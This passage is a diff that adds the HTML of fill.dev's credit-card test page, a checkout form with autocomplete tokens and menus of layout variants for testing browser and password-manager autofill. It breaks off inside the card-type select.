@@ -1,0 +1,635 @@
+<!DOCTYPE html>
+<html class="h-full" lang="en"><head><meta charset="utf-8" /><meta
+            content="width=device-width, initial-scale=1"
+            name="viewport" /><title>Credit card · fill.dev</title><meta
+            content="Test forms for browser and password manager autofill. Every field uses the right HTML autocomplete token so you can check what your filler does."
+            name="description" /><link href="/favicon.svg" rel="icon"
+            type="image/svg+xml" /><link href="/favicon.ico"
+            rel="alternate icon" sizes="32x32 64x64" /><link
+            href="/images/fill-logo.png"
+            rel="apple-touch-icon" /><script>(function(){try{var t=localStorage.getItem('theme');var d=t==='dark'||((!t||t==='system')&&matchMedia('(prefers-color-scheme: dark)').matches);document.documentElement.classList.toggle('dark',d);var p=(navigator.userAgentData&&navigator.userAgentData.platform)||navigator.platform||'';document.documentElement.dataset.os=/mac|iphone|ipad/i.test(p)?'mac':'other';}catch(e){}})();</script><link
+            as="font" crossorigin href="/static/inter-variable-BiZvS1hC.woff2"
+            rel="preload" type="font/woff2" /><link
+            href="/static/styles-CQ3tYrAQ.css" rel="stylesheet" /><script
+            src="/static/main-CBBpuNwP.js" type="module"></script></head><body
+        class="canvas-glow min-h-full font-sans"><div
+            class="min-h-screen lg:flex"><header
+                class="glass sticky top-0 z-10 border-line border-b lg:hidden"><div
+                    class="flex items-center justify-between px-4 py-3"><a
+                        class="group flex items-center gap-3" href="/"><svg
+                            aria-hidden="true"
+                            class="size-9 shrink-0 rounded-xl shadow-card"
+                            viewBox="0 0 64 64"
+                            xmlns="http://www.w3.org/2000/svg"><defs><lineargradient
+                                    id="fill-mark-compact" x1="0" x2="1" y1="0"
+                                    y2="1"><stop offset="0"
+                                        stop-color="#7c3aed"></stop><stop
+                                        offset="1"
+                                        stop-color="#2563eb"></stop></lineargradient></defs><rect
+                                fill="url(#fill-mark-compact)" height="64"
+                                rx="16" width="64"></rect><rect fill="none"
+                                height="20" rx="5" stroke="#fff"
+                                stroke-opacity="0.9" stroke-width="3" width="40"
+                                x="12" y="22"></rect><rect fill="#fff"
+                                height="12" rx="1" width="2.5" x="20"
+                                y="26"></rect><rect fill="#fff"
+                                fill-opacity="0.55" height="3" rx="1.5"
+                                width="18" x="27"
+                                y="30.5"></rect></svg><span><span
+                                class="block font-semibold text-fg text-lg leading-tight tracking-tight">fill<span
+                                    class="text-fg-subtle">.dev</span></span></span></a><div
+                        class="flex items-center gap-2"><button
+                            aria-keyshortcuts="Meta+K Control+K"
+                            aria-label="Search scenarios"
+                            class="flex size-9 items-center justify-center rounded-full border border-line text-fg-muted transition hover:border-line-strong hover:text-fg"
+                            data-open-palette="true" type="button"><svg
+                                aria-hidden="true" class="size-4"
+                                fill="currentColor" viewBox="0 0 256 256"
+                                xmlns="http://www.w3.org/2000/svg"><path
+                                    d="M229.66,218.34l-50.07-50.06a88.11,88.11,0,1,0-11.31,11.31l50.06,50.07a8,8,0,0,0,11.32-11.32ZM40,112a72,72,0,1,1,72,72A72.08,72.08,0,0,1,40,112Z"></path></svg></button><details
+                            class="group"><summary
+                                class="flex size-9 cursor-pointer list-none items-center justify-center rounded-full border border-line text-fg-muted transition group-open:bg-accent-soft group-open:text-fg"><span
+                                    class="sr-only">Menu</span><svg
+                                    aria-hidden="true" class="size-5"
+                                    fill="currentColor" viewBox="0 0 256 256"
+                                    xmlns="http://www.w3.org/2000/svg"><path
+                                        d="M224,128a8,8,0,0,1-8,8H40a8,8,0,0,1,0-16H216A8,8,0,0,1,224,128ZM40,72H216a8,8,0,0,0,0-16H40a8,8,0,0,0,0,16ZM216,184H40a8,8,0,0,0,0,16H216a8,8,0,0,0,0-16Z"></path></svg></summary><div
+                                class="glass absolute inset-x-0 top-full max-h-[70vh] overflow-y-auto border-line border-b px-4 py-4 shadow-card-hover"><nav
+                                    aria-label="Scenarios"
+                                    class="flex flex-col gap-6"><div><h2
+                                            class="mb-1.5 px-2 font-semibold text-fg-subtle text-xs uppercase tracking-wider">Scenarios</h2><ul
+                                            class="flex flex-col gap-0.5"><li><a
+                                                    class="flex items-center justify-between gap-2 rounded-lg px-2 py-1.5 text-fg-muted text-sm transition hover:bg-surface-raised hover:text-fg aria-[current=page]:bg-accent-soft aria-[current=page]:font-medium aria-[current=page]:text-fg"
+                                                    href="/login"
+                                                    title="Sign-in forms in every shape a password manager meets in the wild.">Login</a></li><li><a
+                                                    class="flex items-center justify-between gap-2 rounded-lg px-2 py-1.5 text-fg-muted text-sm transition hover:bg-surface-raised hover:text-fg aria-[current=page]:bg-accent-soft aria-[current=page]:font-medium aria-[current=page]:text-fg"
+                                                    href="/registration"
+                                                    title="Sign-up forms: identifiers, multi-step flows, password rules and second-factor enrolment.">Registration</a></li><li><a
+                                                    class="flex items-center justify-between gap-2 rounded-lg px-2 py-1.5 text-fg-muted text-sm transition hover:bg-surface-raised hover:text-fg aria-[current=page]:bg-accent-soft aria-[current=page]:font-medium aria-[current=page]:text-fg"
+                                                    href="/change-password"
+                                                    title="Current password plus a new one entered twice, on one page or two.">Change
+                                                    password</a></li><li><a
+                                                    aria-current="page"
+                                                    class="flex items-center justify-between gap-2 rounded-lg px-2 py-1.5 text-fg-muted text-sm transition hover:bg-surface-raised hover:text-fg aria-[current=page]:bg-accent-soft aria-[current=page]:font-medium aria-[current=page]:text-fg"
+                                                    href="/credit-card"
+                                                    title="Checkout card forms with split or combined expiry fields.">Credit
+                                                    card</a></li><li><a
+                                                    class="flex items-center justify-between gap-2 rounded-lg px-2 py-1.5 text-fg-muted text-sm transition hover:bg-surface-raised hover:text-fg aria-[current=page]:bg-accent-soft aria-[current=page]:font-medium aria-[current=page]:text-fg"
+                                                    href="/identity"
+                                                    title="Name, contact and postal address forms, with native or custom widgets and wizards.">Identity</a></li><li><a
+                                                    class="flex items-center justify-between gap-2 rounded-lg px-2 py-1.5 text-fg-muted text-sm transition hover:bg-surface-raised hover:text-fg aria-[current=page]:bg-accent-soft aria-[current=page]:font-medium aria-[current=page]:text-fg"
+                                                    href="/avoid"
+                                                    title="Forms a filler should leave alone.">Avoid</a></li><li><a
+                                                    class="flex items-center justify-between gap-2 rounded-lg px-2 py-1.5 text-fg-muted text-sm transition hover:bg-surface-raised hover:text-fg aria-[current=page]:bg-accent-soft aria-[current=page]:font-medium aria-[current=page]:text-fg"
+                                                    href="/passkeys"
+                                                    title="Real WebAuthn ceremonies: register, then sign in explicitly, conditionally, or with a code after.">Passkeys</a></li><li><a
+                                                    class="flex items-center justify-between gap-2 rounded-lg px-2 py-1.5 text-fg-muted text-sm transition hover:bg-surface-raised hover:text-fg aria-[current=page]:bg-accent-soft aria-[current=page]:font-medium aria-[current=page]:text-fg"
+                                                    href="/save"
+                                                    title="Random login, card and API key items to push into 1Password with the Save button.">Save
+                                                    in
+                                                    1Password</a></li></ul></div><div><h2
+                                            class="mb-1.5 px-2 font-semibold text-fg-subtle text-xs uppercase tracking-wider">References</h2><ul
+                                            class="flex flex-col gap-0.5"><li><a
+                                                    class="flex items-center justify-between gap-2 rounded-lg px-2 py-1.5 text-fg-muted text-sm transition hover:bg-surface-raised hover:text-fg aria-[current=page]:bg-accent-soft aria-[current=page]:font-medium aria-[current=page]:text-fg"
+                                                    href="/reference/whatwg"
+                                                    title="The HTML living standard section that defines autocomplete.">HTML
+                                                    autofill spec<svg
+                                                        aria-hidden="true"
+                                                        class="size-3.5 shrink-0 text-fg-subtle"
+                                                        fill="currentColor"
+                                                        viewBox="0 0 256 256"
+                                                        xmlns="http://www.w3.org/2000/svg"><path
+                                                            d="M200,64V168a8,8,0,0,1-16,0V83.31L69.66,197.66a8,8,0,0,1-11.32-11.32L172.69,72H88a8,8,0,0,1,0-16H192A8,8,0,0,1,200,64Z"></path></svg></a></li><li><a
+                                                    class="flex items-center justify-between gap-2 rounded-lg px-2 py-1.5 text-fg-muted text-sm transition hover:bg-surface-raised hover:text-fg aria-[current=page]:bg-accent-soft aria-[current=page]:font-medium aria-[current=page]:text-fg"
+                                                    href="/reference/1password"
+                                                    title="How to design sign-in and checkout pages that fill well.">1Password
+                                                    developer guide<svg
+                                                        aria-hidden="true"
+                                                        class="size-3.5 shrink-0 text-fg-subtle"
+                                                        fill="currentColor"
+                                                        viewBox="0 0 256 256"
+                                                        xmlns="http://www.w3.org/2000/svg"><path
+                                                            d="M200,64V168a8,8,0,0,1-16,0V83.31L69.66,197.66a8,8,0,0,1-11.32-11.32L172.69,72H88a8,8,0,0,1,0-16H192A8,8,0,0,1,200,64Z"></path></svg></a></li></ul></div></nav></div></details></div></div></header><aside
+                class="glass hidden border-line border-r lg:sticky lg:top-0 lg:flex lg:h-screen lg:w-64 lg:shrink-0 lg:flex-col lg:gap-8 lg:overflow-y-auto lg:px-4 lg:py-6"><a
+                    class="group flex items-center gap-3" href="/"><svg
+                        aria-hidden="true"
+                        class="size-9 shrink-0 rounded-xl shadow-card"
+                        viewBox="0 0 64 64"
+                        xmlns="http://www.w3.org/2000/svg"><defs><lineargradient
+                                id="fill-mark-sidebar" x1="0" x2="1" y1="0"
+                                y2="1"><stop offset="0"
+                                    stop-color="#7c3aed"></stop><stop offset="1"
+                                    stop-color="#2563eb"></stop></lineargradient></defs><rect
+                            fill="url(#fill-mark-sidebar)" height="64" rx="16"
+                            width="64"></rect><rect fill="none" height="20"
+                            rx="5" stroke="#fff" stroke-opacity="0.9"
+                            stroke-width="3" width="40" x="12"
+                            y="22"></rect><rect fill="#fff" height="12" rx="1"
+                            width="2.5" x="20" y="26"></rect><rect fill="#fff"
+                            fill-opacity="0.55" height="3" rx="1.5" width="18"
+                            x="27" y="30.5"></rect></svg><span><span
+                            class="block font-semibold text-fg text-lg leading-tight tracking-tight">fill<span
+                                class="text-fg-subtle">.dev</span></span><span
+                            class="block text-fg-muted text-xs leading-snug">Test
+                            forms for browser and password manager
+                            autofill</span></span></a><nav
+                    aria-label="Scenarios" class="flex flex-col gap-6"><div><h2
+                            class="mb-1.5 px-2 font-semibold text-fg-subtle text-xs uppercase tracking-wider">Scenarios</h2><ul
+                            class="flex flex-col gap-0.5"><li><a
+                                    class="flex items-center justify-between gap-2 rounded-lg px-2 py-1.5 text-fg-muted text-sm transition hover:bg-surface-raised hover:text-fg aria-[current=page]:bg-accent-soft aria-[current=page]:font-medium aria-[current=page]:text-fg"
+                                    href="/login"
+                                    title="Sign-in forms in every shape a password manager meets in the wild.">Login</a></li><li><a
+                                    class="flex items-center justify-between gap-2 rounded-lg px-2 py-1.5 text-fg-muted text-sm transition hover:bg-surface-raised hover:text-fg aria-[current=page]:bg-accent-soft aria-[current=page]:font-medium aria-[current=page]:text-fg"
+                                    href="/registration"
+                                    title="Sign-up forms: identifiers, multi-step flows, password rules and second-factor enrolment.">Registration</a></li><li><a
+                                    class="flex items-center justify-between gap-2 rounded-lg px-2 py-1.5 text-fg-muted text-sm transition hover:bg-surface-raised hover:text-fg aria-[current=page]:bg-accent-soft aria-[current=page]:font-medium aria-[current=page]:text-fg"
+                                    href="/change-password"
+                                    title="Current password plus a new one entered twice, on one page or two.">Change
+                                    password</a></li><li><a aria-current="page"
+                                    class="flex items-center justify-between gap-2 rounded-lg px-2 py-1.5 text-fg-muted text-sm transition hover:bg-surface-raised hover:text-fg aria-[current=page]:bg-accent-soft aria-[current=page]:font-medium aria-[current=page]:text-fg"
+                                    href="/credit-card"
+                                    title="Checkout card forms with split or combined expiry fields.">Credit
+                                    card</a></li><li><a
+                                    class="flex items-center justify-between gap-2 rounded-lg px-2 py-1.5 text-fg-muted text-sm transition hover:bg-surface-raised hover:text-fg aria-[current=page]:bg-accent-soft aria-[current=page]:font-medium aria-[current=page]:text-fg"
+                                    href="/identity"
+                                    title="Name, contact and postal address forms, with native or custom widgets and wizards.">Identity</a></li><li><a
+                                    class="flex items-center justify-between gap-2 rounded-lg px-2 py-1.5 text-fg-muted text-sm transition hover:bg-surface-raised hover:text-fg aria-[current=page]:bg-accent-soft aria-[current=page]:font-medium aria-[current=page]:text-fg"
+                                    href="/avoid"
+                                    title="Forms a filler should leave alone.">Avoid</a></li><li><a
+                                    class="flex items-center justify-between gap-2 rounded-lg px-2 py-1.5 text-fg-muted text-sm transition hover:bg-surface-raised hover:text-fg aria-[current=page]:bg-accent-soft aria-[current=page]:font-medium aria-[current=page]:text-fg"
+                                    href="/passkeys"
+                                    title="Real WebAuthn ceremonies: register, then sign in explicitly, conditionally, or with a code after.">Passkeys</a></li><li><a
+                                    class="flex items-center justify-between gap-2 rounded-lg px-2 py-1.5 text-fg-muted text-sm transition hover:bg-surface-raised hover:text-fg aria-[current=page]:bg-accent-soft aria-[current=page]:font-medium aria-[current=page]:text-fg"
+                                    href="/save"
+                                    title="Random login, card and API key items to push into 1Password with the Save button.">Save
+                                    in 1Password</a></li></ul></div><div><h2
+                            class="mb-1.5 px-2 font-semibold text-fg-subtle text-xs uppercase tracking-wider">References</h2><ul
+                            class="flex flex-col gap-0.5"><li><a
+                                    class="flex items-center justify-between gap-2 rounded-lg px-2 py-1.5 text-fg-muted text-sm transition hover:bg-surface-raised hover:text-fg aria-[current=page]:bg-accent-soft aria-[current=page]:font-medium aria-[current=page]:text-fg"
+                                    href="/reference/whatwg"
+                                    title="The HTML living standard section that defines autocomplete.">HTML
+                                    autofill spec<svg aria-hidden="true"
+                                        class="size-3.5 shrink-0 text-fg-subtle"
+                                        fill="currentColor"
+                                        viewBox="0 0 256 256"
+                                        xmlns="http://www.w3.org/2000/svg"><path
+                                            d="M200,64V168a8,8,0,0,1-16,0V83.31L69.66,197.66a8,8,0,0,1-11.32-11.32L172.69,72H88a8,8,0,0,1,0-16H192A8,8,0,0,1,200,64Z"></path></svg></a></li><li><a
+                                    class="flex items-center justify-between gap-2 rounded-lg px-2 py-1.5 text-fg-muted text-sm transition hover:bg-surface-raised hover:text-fg aria-[current=page]:bg-accent-soft aria-[current=page]:font-medium aria-[current=page]:text-fg"
+                                    href="/reference/1password"
+                                    title="How to design sign-in and checkout pages that fill well.">1Password
+                                    developer guide<svg aria-hidden="true"
+                                        class="size-3.5 shrink-0 text-fg-subtle"
+                                        fill="currentColor"
+                                        viewBox="0 0 256 256"
+                                        xmlns="http://www.w3.org/2000/svg"><path
+                                            d="M200,64V168a8,8,0,0,1-16,0V83.31L69.66,197.66a8,8,0,0,1-11.32-11.32L172.69,72H88a8,8,0,0,1,0-16H192A8,8,0,0,1,200,64Z"></path></svg></a></li></ul></div></nav><div
+                    class="mt-auto pt-4"><button
+                        aria-keyshortcuts="Meta+K Control+K"
+                        class="group flex w-full items-center justify-between gap-3 rounded-xl bg-accent-soft px-3 py-2.5 text-left text-fg text-sm shadow-card outline-accent/60 transition hover:ring-1 hover:ring-accent/40 focus-visible:outline-2 focus-visible:outline-offset-2"
+                        data-open-palette="true" type="button"><span
+                            class="flex items-center gap-2 font-medium"><svg
+                                aria-hidden="true" class="size-4 text-accent"
+                                fill="currentColor" viewBox="0 0 256 256"
+                                xmlns="http://www.w3.org/2000/svg"><path
+                                    d="M229.66,218.34l-50.07-50.06a88.11,88.11,0,1,0-11.31,11.31l50.06,50.07a8,8,0,0,0,11.32-11.32ZM40,112a72,72,0,1,1,72,72A72.08,72.08,0,0,1,40,112Z"></path></svg>Find
+                            a scenario</span><span
+                            class="rounded-md border border-line bg-surface px-1.5 py-0.5 text-fg-subtle"><span
+                                class="inline-flex font-mono text-[10px]"><kbd
+                                    class="kbd-mac">⌘K</kbd><kbd
+                                    class="kbd-other">Ctrl
+                                    K</kbd></span></span></button></div></aside><div
+                class="flex min-h-screen min-w-0 flex-1 flex-col"><main
+                    class="mx-auto w-full max-w-6xl flex-1 animate-fade-up px-6 pt-10 pb-6 sm:pt-14"><header
+                        class="max-w-2xl"><p
+                            class="font-semibold text-accent text-xs uppercase tracking-wider">Credit
+                            Card</p><h1
+                            class="mt-1 font-semibold text-3xl text-fg tracking-tight">Credit
+                            card</h1><p class="mt-2 text-fg-muted">Checkout card
+                            forms with split or combined expiry
+                            fields.</p></header><div class="mt-5 max-w-2xl"><div
+                            class="flex flex-wrap items-center gap-1.5"
+                            data-knobs="true"><button
+                                class="inline-flex items-center gap-1.5 rounded-full border px-2.5 py-1 text-xs shadow-card outline-accent/60 transition focus-visible:outline-2 focus-visible:outline-offset-2 border-line bg-surface text-fg-muted hover:border-line-strong hover:text-fg"
+                                type="button" popovertarget="knob-expiry"><span
+                                    class="text-fg-subtle">Expiry</span>Split
+                                selects<svg aria-hidden="true"
+                                    class="size-3 text-fg-subtle"
+                                    fill="currentColor"
+                                    viewBox="0 0 256 256"><path
+                                        d="M213.66,101.66l-80,80a8,8,0,0,1-11.32,0l-80-80A8,8,0,0,1,53.66,90.34L128,164.69l74.34-74.35a8,8,0,0,1,11.32,11.32Z"></path></svg></button><div
+                                class="w-64 rounded-2xl border border-line bg-surface p-1.5 text-fg shadow-card-hover"
+                                data-knob-menu="true" id="knob-expiry"
+                                popover="auto"><h3
+                                    class="px-3 pt-1.5 pb-1 font-semibold text-[10px] text-fg-subtle uppercase tracking-wider">Expiry</h3><nav
+                                    aria-label="Expiry"
+                                    class="flex flex-col gap-0.5"><a
+                                        aria-current="true"
+                                        class="flex flex-col gap-0.5 rounded-xl px-3 py-1.5 text-sm text-fg-muted transition hover:bg-surface-raised hover:text-fg aria-[current=true]:bg-accent-soft aria-[current=true]:text-fg"
+                                        href="/credit-card"><span
+                                            class="font-medium">Split
+                                            selects</span><span
+                                            class="text-fg-subtle text-xs">Month
+                                            and year
+                                            &lt;select&gt;s</span></a><a
+                                        class="flex flex-col gap-0.5 rounded-xl px-3 py-1.5 text-sm text-fg-muted transition hover:bg-surface-raised hover:text-fg aria-[current=true]:bg-accent-soft aria-[current=true]:text-fg"
+                                        href="/credit-card?expiry=combined"><span
+                                            class="font-medium">Combined
+                                            MM/YY</span><span
+                                            class="text-fg-subtle text-xs">One
+                                            MM/YY text
+                                            field</span></a></nav></div><button
+                                class="inline-flex items-center gap-1.5 rounded-full border px-2.5 py-1 text-xs shadow-card outline-accent/60 transition focus-visible:outline-2 focus-visible:outline-offset-2 border-line bg-surface text-fg-muted hover:border-line-strong hover:text-fg"
+                                type="button" popovertarget="knob-type"><span
+                                    class="text-fg-subtle">Card type</span>Type
+                                select<svg aria-hidden="true"
+                                    class="size-3 text-fg-subtle"
+                                    fill="currentColor"
+                                    viewBox="0 0 256 256"><path
+                                        d="M213.66,101.66l-80,80a8,8,0,0,1-11.32,0l-80-80A8,8,0,0,1,53.66,90.34L128,164.69l74.34-74.35a8,8,0,0,1,11.32,11.32Z"></path></svg></button><div
+                                class="w-64 rounded-2xl border border-line bg-surface p-1.5 text-fg shadow-card-hover"
+                                data-knob-menu="true" id="knob-type"
+                                popover="auto"><h3
+                                    class="px-3 pt-1.5 pb-1 font-semibold text-[10px] text-fg-subtle uppercase tracking-wider">Card
+                                    type</h3><nav aria-label="Card type"
+                                    class="flex flex-col gap-0.5"><a
+                                        aria-current="true"
+                                        class="flex flex-col gap-0.5 rounded-xl px-3 py-1.5 text-sm text-fg-muted transition hover:bg-surface-raised hover:text-fg aria-[current=true]:bg-accent-soft aria-[current=true]:text-fg"
+                                        href="/credit-card"><span
+                                            class="font-medium">Type
+                                            select</span></a><a
+                                        class="flex flex-col gap-0.5 rounded-xl px-3 py-1.5 text-sm text-fg-muted transition hover:bg-surface-raised hover:text-fg aria-[current=true]:bg-accent-soft aria-[current=true]:text-fg"
+                                        href="/credit-card?type=none"><span
+                                            class="font-medium">None</span><span
+                                            class="text-fg-subtle text-xs">No
+                                            cc-type
+                                            field</span></a></nav></div><span
+                                aria-hidden="true"
+                                class="mx-0.5 h-4 w-px bg-line"></span><button
+                                aria-controls="customize"
+                                class="inline-flex items-center gap-1.5 rounded-full border px-2.5 py-1 text-xs shadow-card outline-accent/60 transition focus-visible:outline-2 focus-visible:outline-offset-2 border-line bg-surface text-fg-muted hover:border-line-strong hover:text-fg"
+                                data-toggle-dialog="customize"
+                                type="button"><svg aria-hidden="true"
+                                    class="size-3.5" fill="currentColor"
+                                    viewBox="0 0 256 256"
+                                    xmlns="http://www.w3.org/2000/svg"><path
+                                        d="M40,88H73a32,32,0,0,0,62,0h81a8,8,0,0,0,0-16H135a32,32,0,0,0-62,0H40a8,8,0,0,0,0,16Zm64-24A16,16,0,1,1,88,80,16,16,0,0,1,104,64ZM216,168H199a32,32,0,0,0-62,0H40a8,8,0,0,0,0,16h97a32,32,0,0,0,62,0h17a8,8,0,0,0,0-16Zm-48,24a16,16,0,1,1,16-16A16,16,0,0,1,168,192Z"></path></svg>Customize</button><dialog
+                                aria-labelledby="customize-title"
+                                class="fixed top-4 right-4 bottom-4 left-auto z-30 m-0 h-auto max-h-none w-[min(92vw,22rem)] rounded-2xl border border-line bg-surface p-0 text-fg shadow-card-hover"
+                                data-customize="true" id="customize"><div
+                                    class="flex h-full flex-col"><div
+                                        class="flex items-start justify-between gap-4 border-line border-b px-5 py-4"><div><h2
+                                                class="font-semibold text-fg text-lg tracking-tight"
+                                                id="customize-title">Customize</h2></div><button
+                                            aria-label="Close"
+                                            class="-mt-1 -mr-1 rounded-full p-1.5 text-fg-subtle transition hover:bg-surface-raised hover:text-fg"
+                                            data-close-dialog="customize"
+                                            type="button">×</button></div><div
+                                        class="flex flex-1 flex-col gap-5 overflow-y-auto px-5 py-4"><div
+                                            class="flex flex-col gap-2"><h3
+                                                class="font-semibold text-[10px] text-fg-subtle uppercase tracking-wider">Container</h3><nav
+                                                aria-label="Container"
+                                                class="flex flex-wrap gap-1"><a
+                                                    aria-current="true"
+                                                    class="inline-flex items-center gap-1.5 rounded-full border px-2.5 py-1 text-xs shadow-card outline-accent/60 transition focus-visible:outline-2 focus-visible:outline-offset-2 border-accent/40 bg-accent-soft font-medium text-fg"
+                                                    href="/credit-card">Page</a><a
+                                                    class="inline-flex items-center gap-1.5 rounded-full border px-2.5 py-1 text-xs shadow-card outline-accent/60 transition focus-visible:outline-2 focus-visible:outline-offset-2 border-line bg-surface text-fg-muted hover:border-line-strong hover:text-fg"
+                                                    href="/credit-card?container=dialog"
+                                                    title="Native &lt;dialog&gt;, modal or non-modal">Dialog</a><a
+                                                    class="inline-flex items-center gap-1.5 rounded-full border px-2.5 py-1 text-xs shadow-card outline-accent/60 transition focus-visible:outline-2 focus-visible:outline-offset-2 border-line bg-surface text-fg-muted hover:border-line-strong hover:text-fg"
+                                                    href="/credit-card?container=dialog-positioned"
+                                                    title="Fixed to the top-right corner">Positioned
+                                                    dialog</a><a
+                                                    class="inline-flex items-center gap-1.5 rounded-full border px-2.5 py-1 text-xs shadow-card outline-accent/60 transition focus-visible:outline-2 focus-visible:outline-offset-2 border-line bg-surface text-fg-muted hover:border-line-strong hover:text-fg"
+                                                    href="/credit-card?container=iframe"
+                                                    title="Same-origin child frame">iframe</a><a
+                                                    class="inline-flex items-center gap-1.5 rounded-full border px-2.5 py-1 text-xs shadow-card outline-accent/60 transition focus-visible:outline-2 focus-visible:outline-offset-2 border-line bg-surface text-fg-muted hover:border-line-strong hover:text-fg"
+                                                    href="/credit-card?container=nested-iframe"
+                                                    title="Two frames deep">Nested
+                                                    iframe</a><a
+                                                    class="inline-flex items-center gap-1.5 rounded-full border px-2.5 py-1 text-xs shadow-card outline-accent/60 transition focus-visible:outline-2 focus-visible:outline-offset-2 border-line bg-surface text-fg-muted hover:border-line-strong hover:text-fg"
+                                                    href="/credit-card?container=frameset"
+                                                    title="Legacy &lt;frameset&gt; document">Frameset</a><a
+                                                    class="inline-flex items-center gap-1.5 rounded-full border px-2.5 py-1 text-xs shadow-card outline-accent/60 transition focus-visible:outline-2 focus-visible:outline-offset-2 border-line bg-surface text-fg-muted hover:border-line-strong hover:text-fg"
+                                                    href="/credit-card?container=shadow"
+                                                    title="Declarative open shadow root">Shadow
+                                                    DOM</a></nav></div><div
+                                            class="flex flex-col gap-2"><h3
+                                                class="font-semibold text-[10px] text-fg-subtle uppercase tracking-wider">Visibility</h3><nav
+                                                aria-label="Visibility"
+                                                class="flex flex-wrap gap-1"><a
+                                                    aria-current="true"
+                                                    class="inline-flex items-center gap-1.5 rounded-full border px-2.5 py-1 text-xs shadow-card outline-accent/60 transition focus-visible:outline-2 focus-visible:outline-offset-2 border-accent/40 bg-accent-soft font-medium text-fg"
+                                                    href="/credit-card">Visible</a><a
+                                                    class="inline-flex items-center gap-1.5 rounded-full border px-2.5 py-1 text-xs shadow-card outline-accent/60 transition focus-visible:outline-2 focus-visible:outline-offset-2 border-line bg-surface text-fg-muted hover:border-line-strong hover:text-fg"
+                                                    href="/credit-card?reveal=display-none"
+                                                    title="display:none until a click">display:none</a><a
+                                                    class="inline-flex items-center gap-1.5 rounded-full border px-2.5 py-1 text-xs shadow-card outline-accent/60 transition focus-visible:outline-2 focus-visible:outline-offset-2 border-line bg-surface text-fg-muted hover:border-line-strong hover:text-fg"
+                                                    href="/credit-card?reveal=zero-size"
+                                                    title="0×0 clipping wrapper until a click">Zero
+                                                    size</a><a
+                                                    class="inline-flex items-center gap-1.5 rounded-full border px-2.5 py-1 text-xs shadow-card outline-accent/60 transition focus-visible:outline-2 focus-visible:outline-offset-2 border-line bg-surface text-fg-muted hover:border-line-strong hover:text-fg"
+                                                    href="/credit-card?reveal=inserted"
+                                                    title="Injected from a &lt;template&gt;, shown 2s later">Inserted
+                                                    later</a><a
+                                                    class="inline-flex items-center gap-1.5 rounded-full border px-2.5 py-1 text-xs shadow-card outline-accent/60 transition focus-visible:outline-2 focus-visible:outline-offset-2 border-line bg-surface text-fg-muted hover:border-line-strong hover:text-fg"
+                                                    href="/credit-card?reveal=scroll"
+                                                    title="Four viewports below the fold">Below
+                                                    the fold</a></nav></div><div
+                                            class="flex flex-col gap-2"><h3
+                                                class="font-semibold text-[10px] text-fg-subtle uppercase tracking-wider">Markup</h3><nav
+                                                aria-label="Markup"
+                                                class="flex flex-wrap gap-1"><a
+                                                    aria-current="true"
+                                                    class="inline-flex items-center gap-1.5 rounded-full border px-2.5 py-1 text-xs shadow-card outline-accent/60 transition focus-visible:outline-2 focus-visible:outline-offset-2 border-accent/40 bg-accent-soft font-medium text-fg"
+                                                    href="/credit-card">&lt;form&gt;</a><a
+                                                    class="inline-flex items-center gap-1.5 rounded-full border px-2.5 py-1 text-xs shadow-card outline-accent/60 transition focus-visible:outline-2 focus-visible:outline-offset-2 border-line bg-surface text-fg-muted hover:border-line-strong hover:text-fg"
+                                                    href="/credit-card?markup=noform"
+                                                    title="Inputs in a &lt;div&gt;, posted with fetch">No
+                                                    &lt;form&gt;</a></nav></div><div
+                                            class="flex flex-col gap-2"><h3
+                                                class="font-semibold text-[10px] text-fg-subtle uppercase tracking-wider">Page
+                                                weight</h3><nav
+                                                aria-label="Page weight"
+                                                class="flex flex-wrap gap-1"><a
+                                                    aria-current="true"
+                                                    class="inline-flex items-center gap-1.5 rounded-full border px-2.5 py-1 text-xs shadow-card outline-accent/60 transition focus-visible:outline-2 focus-visible:outline-offset-2 border-accent/40 bg-accent-soft font-medium text-fg"
+                                                    href="/credit-card">Normal</a><a
+                                                    class="inline-flex items-center gap-1.5 rounded-full border px-2.5 py-1 text-xs shadow-card outline-accent/60 transition focus-visible:outline-2 focus-visible:outline-offset-2 border-line bg-surface text-fg-muted hover:border-line-strong hover:text-fg"
+                                                    href="/credit-card?weight=heavy"
+                                                    title="Marketing page with hundreds of nodes and other forms">Heavy</a><a
+                                                    class="inline-flex items-center gap-1.5 rounded-full border px-2.5 py-1 text-xs shadow-card outline-accent/60 transition focus-visible:outline-2 focus-visible:outline-offset-2 border-line bg-surface text-fg-muted hover:border-line-strong hover:text-fg"
+                                                    href="/credit-card?weight=mutating"
+                                                    title="Heavy plus a DOM that mutates every 120ms">Mutating</a></nav></div></div><div
+                                        class="flex items-center justify-between gap-3 border-line border-t px-5 py-3"><input
+                                            aria-label="Link to this scenario"
+                                            class="sr-only" id="scenario-link"
+                                            readonly tabindex="-1" type="text"
+                                            value="/credit-card" /><button
+                                            class="inline-flex items-center gap-1.5 rounded-full border px-2.5 py-1 text-xs shadow-card outline-accent/60 transition focus-visible:outline-2 focus-visible:outline-offset-2 border-line bg-surface text-fg-muted hover:border-line-strong hover:text-fg"
+                                            data-copy="#scenario-link"
+                                            type="button"><svg
+                                                aria-hidden="true"
+                                                class="size-3.5"
+                                                fill="currentColor"
+                                                viewBox="0 0 256 256"
+                                                xmlns="http://www.w3.org/2000/svg"><path
+                                                    d="M216,32H88a8,8,0,0,0-8,8V80H40a8,8,0,0,0-8,8V216a8,8,0,0,0,8,8H168a8,8,0,0,0,8-8V176h40a8,8,0,0,0,8-8V40A8,8,0,0,0,216,32ZM160,208H48V96H160Zm48-48H176V88a8,8,0,0,0-8-8H96V48H208Z"></path></svg>Copy
+                                            link</button><a
+                                            class="inline-flex items-center gap-1.5 rounded-full border border-rose-500/30 bg-rose-500/10 px-3 py-1 font-medium text-rose-600 text-xs transition hover:bg-rose-500/20 dark:text-rose-300"
+                                            href="/credit-card">Reset</a></div></div></dialog></div></div><div
+                        class="mt-6 max-w-2xl" data-scenario-body="true"><form id="card-send"
+                            action="/submit" method="post"
+                            class="glass flex flex-col gap-4 rounded-2xl border border-line p-6 shadow-card"><div
+                                class="flex flex-col gap-1.5"><label
+                                    class="block font-medium text-fg text-sm"
+                                    for="cc-name">Name on card</label><input
+                                    autocomplete="cc-name" autofocus
+                                    id="cc-name" name="cc-name" required
+                                    type="text"
+                                    class="field-control" /></div><div
+                                class="flex flex-col gap-1.5"><label
+                                    class="block font-medium text-fg text-sm"
+                                    for="cc-type">Type</label><select
+                                    autocomplete="cc-type" id="cc-type"
+                                    name="cc-type" required
+                                    class="field-control"><option selected
+                                        value>Choose...</option><option
+                                        value="visa">Visa</option><option
+                                        value="mc">Master Card</option><option
+                                        value="amex">American
